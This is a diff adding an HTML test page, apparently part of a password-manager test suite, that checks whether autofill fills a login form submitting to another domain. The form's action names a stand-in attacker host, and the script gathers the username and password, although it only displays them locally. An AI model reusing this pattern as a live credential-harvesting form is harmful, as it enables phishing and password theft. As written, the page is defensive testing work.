@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cross-Origin Test</title>
+    <link rel="stylesheet" href="/common.css">
+    <script src="/common.js"></script>
+    <style>
+    </style>
+</head>
+<body>
+<div class="form-container">
+    <header class="page-header">
+        <h1>Cross-Origin Autofill Test</h1>
+        <p class="page-description"><em>This page simulates cross-origin attack to test password manager
+            autofill behavior when form submission targets a different domain.</em></p>
+    </header>
+
+    <form id="crossOriginForm" action="https://www.attacker.com/register" method="POST"
+          target="_blank">
+        <label for="username">Username / Email:</label>
+        <input class="visible-field" type="text" id="username" name="username" autocomplete="username"
+               placeholder="Enter your username or email address">
+
+        <label for="password">Password:</label>
+        <input class="visible-field" type="password" id="password" name="password" autocomplete="current-password"
+               placeholder="Enter your password">
+
+        <!-- hidden field to capture submission origin -->
+        <input type="hidden" name="submission_origin" value="cross-origin-test-page">
+
+        <p style="font-size: 0.9rem; color: slategray; margin-top: 10px;">
+            <em>Note: This form submits to <code>https://malicious-attacker.example.com</code> (simulated cross-origin)</em>
+        </p>
+
+        <button type="submit" class="submit-btn">Login</button>
+        <button type="button" class="submit-btn refresh-btn" onclick="onRefresh()">Refresh</button>
+    </form>
+
+    <div class="test-results" id="testResults" style="display: none;">
+        <h3>Test Results</h3>
+        <div id="resultsContent">
+        </div>
+    </div>
+
+</div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        console.log('Cross-origin autofill test page loaded.');
+    });
+
+    document.getElementById('crossOriginForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        const capturedData = {
+            username: username,
+            password: password,
+        };
+
+        // show test results
+        const usernameFilled = username && username.trim() !== '';
+        const passwordFilled = password && password.trim() !== '';
+
+        let resultMessage;
+        let resultColor;
+
+        if (usernameFilled || passwordFilled) {
+            resultMessage = `
+                <h4 style="color: crimson;">⚠️ CROSS-ORIGIN AUTOFILL DETECTED</h4>
+                <p>Your data would have been submitted to:</p>
+                <p><strong>${this.action}</strong></p>
+                <details open>
+                    <summary>Simulated Data Capture</summary>
+                    <pre class="data-display">${JSON.stringify(capturedData, null, 2)}</pre>
+                </details>
+            `;
+            resultColor = 'mistyrose';
+        } else {
+            resultMessage = `
+                <h4 style="color: forestgreen;">✓ NO CROSS-ORIGIN AUTOFILL DETECTED</h4>
+                <p>No credentials were entered. Password manager correctly ignored cross-origin form.</p>
+            `;
+            resultColor = 'honeydew';
+        }
+
+
+        displayTestResults('testResults', 'Test Results: Hidden Field Autofill Detection', resultMessage, resultColor);
+
+        console.log('Cross-origin form submission intercepted:', {
+            usernameFilled,
+            passwordFilled,
+            capturedData: capturedData,
+            timestamp: new Date().toISOString()
+        });
+
+    });
+
+</script>
+</body>
+</html>
